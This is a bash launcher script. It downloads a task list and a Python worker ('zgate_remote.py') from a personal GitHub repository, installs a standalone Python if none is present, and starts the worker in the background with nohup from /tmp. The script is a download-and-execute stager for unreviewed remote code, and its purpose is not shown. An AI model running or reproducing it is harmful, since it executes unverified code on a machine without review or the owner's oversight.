#!/bin/bash
D=/tmp/zgt; mkdir -p $D; cd $D || exit 9
RAW=https://raw.githubusercontent.com/heinzo666/evm-index-data/main
U=$(uname -m)
dl(){ u="$1"; o="$2"
  [ -s "$o" ] && return 0
  if command -v curl >/dev/null 2>&1; then curl -fsSL -m900 -o "$o.part" "$u" && mv "$o.part" "$o" && return 0; fi
  if command -v wget >/dev/null 2>&1; then wget -qO "$o.part" "$u" && mv "$o.part" "$o" && return 0; fi
  if command -v php  >/dev/null 2>&1; then php -r "file_put_contents('$o.part',file_get_contents('$u'));" && mv "$o.part" "$o" && return 0; fi
  return 1; }
dl $RAW/tasks.txt tasks.txt || exit 8
[ -s zg.py ] || dl $RAW/zgate_remote.py zg.py || exit 8
PY=""
for c in python3 python; do p=$(command -v $c 2>/dev/null); [ -n "$p" ] && PY=$p && break; done
if [ -z "$PY" ]; then
  case "$U" in
    aarch64|arm64) PU=cpython-3.12.14%2B20260924-aarch64-unknown-linux-gnu-install_only.tar.gz ;;
    *)             PU=cpython-3.12.14%2B20260924-x86_64-unknown-linux-gnu-install_only.tar.gz ;;
  esac
  dl "https://github.com/astral-sh/python-build-standalone/releases/download/20260924/$PU" py.tgz || exit 7
  rm -rf pyenv; mkdir pyenv
  tar xzf py.tgz -C pyenv --strip-components=1 2>/dev/null || { gzip -dc py.tgz | tar xf - -C pyenv --strip-components=1; } || exit 6
  PY=$D/pyenv/bin/python3
fi
SLICE="${1:-0/2}"; W="${2:-5}"
nohup nice -n 19 "$PY" zg.py --tasks tasks.txt --slice "$SLICE" --workers "$W" --rate 10 --outdir $D >> $D/log.o 2>&1 &
echo "LAUNCHED slice=$SLICE py=$PY"
